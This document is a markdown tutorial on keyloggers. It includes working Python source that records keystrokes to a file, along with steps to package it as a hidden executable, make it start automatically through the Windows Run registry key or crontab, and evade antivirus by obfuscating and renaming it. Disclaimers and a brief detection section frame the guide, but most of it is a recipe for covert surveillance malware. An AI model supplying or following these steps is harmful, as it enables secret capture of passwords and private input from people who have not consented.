# Using a Keylogger App

A **keylogger** is a tool that records keystrokes made on a keyboard. While keyloggers can be used for malicious purposes, they are also used in ethical hacking, parental monitoring, or user behavior analysis.

> **Disclaimer**: Keylogging is considered illegal if performed without proper authorization. Always ensure you have the explicit consent of the user or administrator before employing any keylogger.

---

## 📌 What is a Keylogger?

A **keylogger** (short for "keystroke logger") is a software or hardware tool that monitors and records keystrokes.

### Types of Keyloggers
1. **Software Keyloggers**: Installed on the target device and run in the background.
2. **Hardware Keyloggers**: Physical devices plugged into keyboards or computers.

---

## 🔧 Tools for Keylogging

### 1. Software Keyloggers
- **PyKeylogger**: An open-source Python keylogger.
- **Spyrix**: A user-friendly monitoring tool.
- **KidLogger**: Used for monitoring family devices.

### 2. Custom Python Keylogger
- Write your own keylogger using libraries like `pynput` or `keyboard`.

### 3. Hardware Keyloggers
- **USB Keylogger**: Plugged into a USB port to record keystrokes.
- **PS/2 Keylogger**: Used for older PS/2 keyboard ports.

---

## 🚀 Creating a Software Keylogger in Python

### Example Code
```python
from pynput import keyboard

def on_press(key):
    try:
        with open("key_log.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open("key_log.txt", "a") as file:
            file.write(f"{key} ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

### Steps
1. **Install `pynput` Library**:
   ```bash
   pip install pynput
   ```
2. **Save the Script**: Save the script as `keylogger.py`.
3. **Run the Script**: Execute the script on the target machine (with proper authorization).
4. **Log File**: Keystrokes will be saved in `key_log.txt`.

---

## 🖍️ Deployment Techniques

### 1. Running in the Background
Use Python tools like `pyinstaller` to convert the script into an executable:
```bash
pyinstaller --noconsole --onefile keylogger.py
```
This creates a single executable file that runs without showing a console.

### 2. Persistence
Set the keylogger to start automatically when the system boots:
- Modify startup scripts in Linux (`~/.bashrc` or `crontab`).
- Add the executable to the Windows registry (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`).

---

## 🔐 Preventing Detection

- **Obfuscation**: Encode or encrypt the script using tools like `pyarmor`.
- **Renaming**: Rename the executable to blend with system files.
- **Bypassing Antivirus**: Use advanced techniques (e.g., Veil Framework) to evade detection.

---

## ⚠️ Ethical Considerations

- **Authorization**: Always get explicit permission before using keyloggers.
- **Transparency**: Inform users if you're monitoring their systems.
- **Legal Compliance**: Familiarize yourself with local laws and regulations regarding keylogging.

---

## 🔎 Detecting and Removing Keyloggers

To ensure security and privacy, follow these steps:
1. **Check Active Processes**: Use tools like Task Manager or `htop` to identify suspicious programs.
2. **Run Antivirus Software**: Scan for malware and suspicious scripts.
3. **Monitor Network Traffic**: Look for unauthorized data transfers.
4. **Inspect Startup Scripts**: Check for unknown programs in startup configurations.
